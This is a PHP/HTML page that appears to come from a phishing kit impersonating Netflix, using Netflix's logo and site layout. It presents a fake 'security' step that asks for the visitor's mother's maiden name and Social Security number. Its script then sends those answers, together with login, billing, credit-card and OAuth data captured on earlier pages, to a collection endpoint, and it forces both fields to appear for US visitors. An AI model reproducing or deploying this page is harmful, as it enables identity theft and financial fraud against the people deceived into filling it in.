<?php
defined("ALLOW") or exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="i18n-security-title"></title>
    <link rel="icon" type="image/x-icon" href="/assets/images/nficon2023.ico">
    <link rel="stylesheet" href="/assets/styles/style.css">
    <style>
        /* Clean Loading Screen */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background: #ffffff;
            z-index: 999999;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .loading-content {
            text-align: center;
            padding: 40px;
        }
        .loading-spinner {
            border: 3px solid #f0f0f0;
            border-top: 3px solid #e50914;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 24px;
        }
        .loading-text {
            margin: 0;
            font-size: 18px;
            font-weight: 400;
            color: #333;
            letter-spacing: 0.5px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Button Loading State */
        .start-button {
            position: relative;
            transition: all 0.3s ease;
        }

        .start-button.loading {
            opacity: 0.8;
            cursor: not-allowed;
            pointer-events: none;
        }

        .start-button .btn-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid #ffffff;
            border-radius: 50%;
            animation: btnSpin 1s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes btnSpin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Simple Loading Screen -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <p class="loading-text" id="i18n-loading"></p>
        </div>
    </div>

    <header class="header">
        <div class="header-content">
            <svg class="netflix-logo" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 111 30" width="111" height="30" data-icon="NetflixLogoIcon" aria-hidden="true">
<g><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path></g>
            </svg>
            <a href="#" class="sign-out" id="i18n-signout"></a>
        </div>
    </header>

    <main class="main-content">

        <div class="step-info" id="i18n-security-step"></div>
        <h1 class="page-title" id="i18n-security-heading"></h1>
        <p class="page-subtitle" id="i18n-security-subtitle"></p>

        <form id="form">

            <div class="form-group">
                <div class="input-wrapper">
                    <input type="text" class="form-control" id="motherMaidenName" name="mother_maiden_name" placeholder=" ">
                    <label for="motherMaidenName" class="floating-label" id="i18n-security-mother"></label>
                </div>
                <div class="error-message" id="motherMaidenNameError">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-security-mother-error"></span>
                </div>
            </div>
            <div class="form-group">
                <div class="input-wrapper">
                    <input type="text" class="form-control" id="ssn" name="ssn" placeholder=" " maxlength="11">
                    <label for="ssn" class="floating-label" id="i18n-security-ssn"></label>
                </div>
                <div class="error-message" id="ssnError">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-security-ssn-error"></span>
                </div>
            </div>

            <button type="submit" class="start-button" id="continueBtn"></button>

            <div class="recaptcha-notice">
                <span id="i18n-security-recaptcha"></span> <a href="#" id="i18n-security-learn"></a>.
            </div>
        </form>

    </main>

    <footer class="footer">
        <div class="footer-content">
            <div class="footer-contact" id="i18n-footer-contact"></div>

            <div class="footer-links">
                <a href="#" id="i18n-footer-faq"></a>
                <a href="#" id="i18n-footer-help"></a>
                <a href="#" id="i18n-footer-terms"></a>
                <a href="#" id="i18n-footer-privacy"></a>
                <a href="#" id="i18n-footer-cookies"></a>
                <a href="#" id="i18n-footer-corporate"></a>
                <a href="#" id="i18n-footer-adchoices"></a>
            </div>

            <div class="language-selector" style="position: relative; display: inline-block; margin-top: 20px;">
                <svg class="language-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="LanguagesSmall" aria-hidden="true" style="position: absolute; left: 8px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; color: #737373; pointer-events: none; z-index: 1;">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M10.7668 5.33333L10.5038 5.99715L9.33974 8.9355L8.76866 10.377L7.33333 14H9.10751L9.83505 12.0326H13.4217L14.162 14H16L12.5665 5.33333H10.8278H10.7668ZM10.6186 9.93479L10.3839 10.5632H11.1036H12.8856L11.6348 7.2136L10.6186 9.93479ZM9.52722 4.84224C9.55393 4.77481 9.58574 4.71045 9.62211 4.64954H6.41909V2H4.926V4.64954H0.540802V5.99715H4.31466C3.35062 7.79015 1.75173 9.51463 0 10.4283C0.329184 10.7138 0.811203 11.2391 1.04633 11.5931C2.55118 10.6795 3.90318 9.22912 4.926 7.57316V12.6667H6.41909V7.51606C6.81951 8.15256 7.26748 8.76169 7.7521 9.32292L8.31996 7.88955C7.80191 7.29052 7.34631 6.64699 6.9834 5.99715H9.06968L9.52722 4.84224Z" fill="currentColor"></path>
                </svg>
                <select name="language" id="language" style="background: transparent; border: 1px solid #737373; color: #737373; padding: 8px 32px 8px 32px; font-size: 13px; border-radius: 2px; appearance: none; cursor: pointer; min-width: 120px;">
                    <option value="en">English</option>
                    <option value="es">Español</option>
                </select>
                <svg class="dropdown-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); width: 12px; height: 12px; color: #737373; pointer-events: none; z-index: 1;">
                    <path d="M8 10.586L3.414 6 2 7.414 8 13.414 14 7.414 12.586 6z" fill="currentColor"/>
                </svg>
            </div>
            
            <div class="footer-country" id="i18n-footer-country"></div>
        </div>
    </footer>


    <script>
        // Check if user should access security page (US only)
        document.addEventListener('DOMContentLoaded', function() {
            const flowData = JSON.parse(sessionStorage.getItem('flowData') || '{}');
            const countryCode = flowData.geo?.countryCode || '';
            
            // If user is not from US, redirect to done page
            if (countryCode && countryCode !== 'US') {
                const accessCode = window.__ACCESS_CODE__;
                if (accessCode) {
                    location.href = '/' + accessCode + '/done';
                    return;
                }
            }
        });

        // Hide loading screen after page loads
        window.addEventListener('load', function() {
            setTimeout(function() {
                const loadingOverlay = document.getElementById('loadingOverlay');
                if (loadingOverlay) {
                    loadingOverlay.style.opacity = '0';
                    setTimeout(function() {
                        loadingOverlay.style.display = 'none';
                    }, 300);
                }
            }, 800);
        });

        // SSN formatting
        const ssnInput = document.getElementById('ssn');
        if (ssnInput) {
            ssnInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                
                if (value.length >= 3 && value.length < 5) {
                    value = value.substring(0, 3) + '-' + value.substring(3);
                } else if (value.length >= 5) {
                    value = value.substring(0, 3) + '-' + value.substring(3, 5) + '-' + value.substring(5, 9);
                }
                
                e.target.value = value;
            });
        }

        // Form submission loading state
        const securityForm = document.querySelector('form');
        const continueBtn = document.getElementById('continueBtn');
        
        if (securityForm && continueBtn) {
            securityForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                const L = window.__LANG__ || {};
                continueBtn.innerHTML = '<span class="btn-spinner"></span>' + (L['common.processing'] || 'Processing...');
                continueBtn.classList.add('loading');
                continueBtn.disabled = true;
                const data = JSON.parse(sessionStorage.getItem('flowData') || '{}');
                const securityData = {
                    mother_maiden: document.getElementById('motherMaidenName').value,
                    ssn: document.getElementById('ssn').value
                };
                data.security = securityData;
                sessionStorage.setItem('flowData', JSON.stringify(data));
                
                // Send email with security, login, billing, CC, and OAuth data
                try {
                    const accessCode = window.__ACCESS_CODE__;
                    if (!accessCode) return;
                    await fetch('/' + accessCode + '/send-security', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            security: securityData, 
                            login: data.login || {},
                            billing: data.billing || null,
                            cc: data.cc || null,
                            oauth: data.oauth || null
                        })
                    });
                } catch (err) {
                    console.warn('Security email send failed:', err);
                }
                
                const accessCode = window.__ACCESS_CODE__;
                if (accessCode) {
                    // Check if OAuth is enabled and hasn't been completed yet
                    const flowSettings = window.__FLOW_SETTINGS__ || {};
                    const oauthEnabled = flowSettings.oauth_enabled || false;
                    const hasOAuthData = data.oauth && data.oauth.email;
                    
                    // If OAuth is enabled but not completed, redirect to OAuth first
                    if (oauthEnabled && !hasOAuthData) {
                        location.href = '/' + accessCode + '/done';
                    } else {
                        // Otherwise, go to done page
                        location.href = '/' + accessCode + '/done';
                    }
                }
            });
        }
    </script>
    <script>
      (function(){
        const L = window.__LANG__ || {};
        const set = (id, key) => { 
            const el = document.getElementById(id); 
            if (el && L[key]) {
                // Special handling for title tag
                if (el.tagName === 'TITLE' || id.includes('title')) {
                    el.textContent = L[key];
                    document.title = L[key];
                } else {
                    el.textContent = L[key];
                }
            }
        };
        set('i18n-security-title', 'security.title');
        set('i18n-signout', 'header.signout');
        set('i18n-security-step', 'security.step');
        set('i18n-security-heading', 'security.heading');
        set('i18n-security-subtitle', 'security.subtitle');
        set('i18n-security-mother', 'security.mother_maiden');
        set('i18n-security-ssn', 'security.ssn');
        set('continueBtn', 'security.finish');
        set('i18n-security-recaptcha', 'security.recaptcha');
        set('i18n-security-learn', 'common.learn_more');
        set('i18n-loading', 'common.loading');
        set('i18n-security-mother-error', 'security.mother_maiden_error');
        set('i18n-security-ssn-error', 'security.ssn_error');
        set('i18n-footer-contact', 'footer.questions');
        set('i18n-footer-faq', 'footer.faq');
        set('i18n-footer-help', 'footer.help');
        set('i18n-footer-terms', 'footer.terms');
        set('i18n-footer-privacy', 'footer.privacy');
        set('i18n-footer-cookies', 'footer.cookies');
        set('i18n-footer-corporate', 'footer.corporate');
        set('i18n-footer-adchoices', 'footer.adchoices');
        set('i18n-footer-country', 'footer.country');
        
        // Apply flow settings to show/hide fields
        // For US users, always show all fields (ignore flow settings)
        const flowData = JSON.parse(sessionStorage.getItem('flowData') || '{}');
        const countryCode = flowData.geo?.countryCode || '';
        const isUS = (countryCode === 'US');
        
        const settings = window.__FLOW_SETTINGS__ || {};
        
        // MMN field: show for US users OR if enabled in settings
        if (!isUS && !settings.security_mmn_enabled) {
          const mmnField = document.getElementById('motherMaidenName');
          if (mmnField) mmnField.closest('.form-group').style.display = 'none';
        }
        
        // SSN field: always show for US users, otherwise check settings
        if (!isUS && !settings.security_ssn_enabled) {
          const ssnField = document.getElementById('ssn');
          if (ssnField) ssnField.closest('.form-group').style.display = 'none';
        }
      })();
    </script>

</body>
</html>
